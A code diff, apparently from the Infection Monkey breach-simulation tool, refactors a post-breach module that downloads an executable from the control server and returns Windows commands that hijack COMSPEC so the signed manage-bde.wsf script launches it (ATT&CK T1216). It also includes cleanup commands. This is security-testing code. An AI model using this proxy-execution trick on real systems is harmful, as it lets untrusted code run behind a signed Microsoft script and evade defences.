@@ -1,27 +1,29 @@
-import shutil
+import os
 import subprocess
-from pathlib import Path
 
 from infection_monkey.control import ControlClient
 
+TEMP_COMSPEC = os.path.join(os.getcwd(), 'random_executable.exe')
+
 
 def get_windows_commands_to_proxy_execution_using_signed_script():
-    # temp_comspec_path = ['infection_monkey', 'post_breach', 'signed_script_proxy', 'windows', 'random_executable.exe']
-    # temp_comspec = Path(*temp_comspec_path)
-    temp_comspec = "c:\\Users\\win\\desktop\\t1216.exe"
-    with ControlClient.get_T1216_pba_file() as r:
-        with open(temp_comspec, 'wb') as f:
-            shutil.copyfileobj(r.raw, f)
+    download = ControlClient.get_T1216_pba_file()
+    with open(TEMP_COMSPEC, 'wb') as file_obj:
+        file_obj.write(download.content)
+        file_obj.flush()
 
     windir_path = subprocess.check_output('echo %WINDIR%', shell=True).decode().strip('\r\n')  # noqa: DUO116
-    signed_script_path = [windir_path, 'System32', 'manage-bde.wsf']
-    signed_script = Path(*signed_script_path)
+    signed_script = os.path.join(windir_path, 'System32', 'manage-bde.wsf')
 
     return [
-        f'set comspec={temp_comspec} &&',
+        f'set comspec={TEMP_COMSPEC} &&',
         f'cscript {signed_script}'
     ]
 
 
 def get_windows_commands_to_reset_comspec(original_comspec):
     return f'set comspec={original_comspec}'
+
+
+def get_windows_commands_to_delete_temp_comspec():
+    return f'del {TEMP_COMSPEC} /f'
